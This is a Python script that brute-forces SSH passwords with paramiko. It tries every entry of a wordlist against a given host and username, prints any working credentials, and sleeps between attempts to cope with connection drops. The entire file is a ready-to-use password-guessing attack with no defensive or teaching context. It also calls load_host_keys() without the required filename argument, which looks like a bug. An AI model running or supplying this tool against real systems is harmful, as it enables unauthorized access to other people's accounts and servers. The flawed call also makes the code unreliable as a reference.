import paramiko, sys, socket, time
from pathlib import Path

if len(sys.argv) != 4:
    print(f"Usage: {sys.argv[0]} <HOST> <USERNAME> <WORDLIST>")
    sys.exit(1)

username = sys.argv[2]
ip_address = socket.gethostbyname(sys.argv[1])

client = paramiko.SSHClient()
client.load_host_keys()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

with Path(sys.argv[3]).open(mode="r", encoding="utf-8") as file:
    wordlist = [line.strip() for line in file if line.strip()]

found = False

for line in wordlist:
    try:
        client.connect(ip_address, username=username, password=line, timeout=5, banner_timeout=5, auth_timeout=5)
    except paramiko.ssh_exception.AuthenticationException:
        continue
    except (paramiko.ssh_exception.NoValidConnectionsError, socket.timeout) as e:
        print(f"Inaccessible host: {e}")
        break
    except (paramiko.ssh_exception.SSHException, EOFError) as e:
        print(f"[!] Conexão derrubada pelo servidor: {e}")
        time.sleep(5)
    else:
        print(f"Credentials found! -> {username}:{line}")
        found = True
        client.close()
        break
    finally:
        client.close()

    time.sleep(0.5)

if not found:
    print("No credentials found.")